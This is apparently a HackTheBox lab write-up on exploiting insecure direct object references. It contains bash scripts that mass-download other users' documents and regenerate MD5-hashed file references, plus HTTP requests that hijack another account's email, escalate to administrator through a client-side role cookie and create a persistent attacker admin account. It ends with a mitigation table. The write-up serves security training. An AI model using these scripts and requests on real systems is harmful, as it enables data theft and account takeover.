# Insecure-Direct-Object-References
Mass IDOR Enumeration, API exploitation, and privilege escalation.

By Ramyar Daneshgar 

This document presents a highly detailed technical analysis of **Insecure Direct Object Reference (IDOR) vulnerabilities** exploited within a HackTheBox web application. My methodology entailed **systematic mass enumeration**, **bypassing encoded object references**, and **escalating privileges via insecure API endpoints**. The approach leveraged **cybersecurity principles**, including **parameter fuzzing, access control bypass techniques, and API manipulation**, to achieve full compromise of the application.

---

## **1. Mass IDOR Enumeration**

### **Identification and Initial Assessment**
Upon initial reconnaissance, I identified a web endpoint that exposed user-specific document access through a **query parameterized HTTP GET request**:
```http
http://SERVER_IP:PORT/documents.php?uid=1
```
Observing the **direct object reference (uid=1)** within the URL suggested a potential IDOR vulnerability. I manually altered the **uid** value to test whether access control validation was being enforced at the backend:
```http
http://SERVER_IP:PORT/documents.php?uid=2
```
Upon executing the modified request, the application returned documents belonging to another user, confirming an **authorization bypass**.

### **Pattern Recognition and Forced Browsing Analysis**
Further investigation of the document structure revealed that filenames followed a consistent pattern:
```html
<li><a href='/documents/Invoice_2_08_2020.pdf'>Invoice</a></li>
<li><a href='/documents/Report_2_12_2020.pdf'>Report</a></li>
```
The **predictability of filenames** indicated susceptibility to a **forced browsing attack**, wherein systematically altering file names could lead to unauthorized file retrieval.

### **Automating Mass Enumeration**
To efficiently extract all accessible files, I constructed a **Bash-based enumeration script**:
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..100}; do  # Iterate through user IDs
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link  # Download each document
    done
done
```
#### **Results:**
- Successfully retrieved documents from multiple unauthorized accounts.
- Confirmed **backend access control failure** due to improper enforcement of role-based validation.

---

## **2. Bypassing Encoded Object References**

### **Encoded Reference Discovery**
While examining API responses, I discovered that some files were referenced using **hashed identifiers** rather than sequential numerical values. A request to retrieve a contract file appeared as follows:
```http
POST /download.php
Content-Type: application/x-www-form-urlencoded

contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```
This suggested an attempt at **Secure Direct Object Referencing (SDOR)**, intended to prevent IDOR exploitation by obscuring object references. However, the implementation relied on **MD5 hashing**, which is inherently predictable and reversible given knowledge of the input format.

### **Reverse Engineering the Hashing Mechanism**
Decompiling JavaScript within the web client revealed the hashing logic:
```js
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
I identified that the application processed identifiers as follows:
1. **Base64 encoding the UID** (`btoa(uid)`).
2. **Computing an MD5 hash** of the encoded value (`CryptoJS.MD5()`).

### **Hash Generation and Exploitation**
Utilizing this knowledge, I computed **valid object references** dynamically:
```bash
for i in {1..100}; do
    echo -n $i | base64 -w 0 | md5sum | tr -d ' -'
done
```
### **Automated Data Exfiltration**
With valid hashed identifiers generated, I deployed a **Bash-based mass retrieval exploit**:
```bash
#!/bin/bash

for i in {1..100}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
done
```
#### **Results:**
- Successfully retrieved all **restricted contract files**.
- Confirmed **weak encoding mechanisms** that provided no true security against enumeration attacks.

---

## **3. API Exploitation and Privilege Escalation**

### **Intercepting API Requests**
I monitored API traffic using **Burp Suite** and identified a **PUT request modifying user profiles**:
```http
PUT /profile/api.php/profile/1
Content-Type: application/json
Cookie: role=employee

{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb"
}
```
The critical observation was that **authorization control was dependent on a client-side cookie (`role=employee`)**, indicating a **severe security flaw**.

### **Privilege Escalation via API Manipulation**
#### ** Unauthorized User Modification**
I modified a request to **edit another user’s profile**:
```http
PUT /profile/api.php/profile/2
Content-Type: application/json
Cookie: role=employee

{
    "uid": 2,
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "full_name": "Compromised User",
    "email": "attacker@employees.htb"
}
```
 **Impact:** Enabled password reset takeover of the target account.

#### ** Escalating Privileges to Administrator**
```http
PUT /profile/api.php/profile/1
Content-Type: application/json
Cookie: role=employee

{
    "uid": 1,
    "role": "web_admin"
}
```
 **Effect:** Elevated my privileges to **administrator**.

#### **Creating a Persistent Admin Account**
```http
POST /profile/api.php/profile
Content-Type: application/json
Cookie: role=web_admin

{
    "uid": 100,
    "role": "web_admin",
    "full_name": "Persistent Attacker",
    "email": "attacker@employees.htb"
}
```
 **Effect:** Established an **admin foothold**, ensuring persistent access.

---

## **4. Mitigation Strategies**

| **Vulnerability** | **Recommended Mitigation** |
|-------------------|----------------------------|
| **Mass IDOR Enumeration** | Enforce **Role-Based Access Control (RBAC)** and **strict backend validation**. |
| **Bypassing Encoded References** | Replace **predictable hashes** with **cryptographically secure UUIDs**. |
| **Insecure API Authorization** | Implement **server-side access control validation**, eliminating reliance on **client-side roles**. |


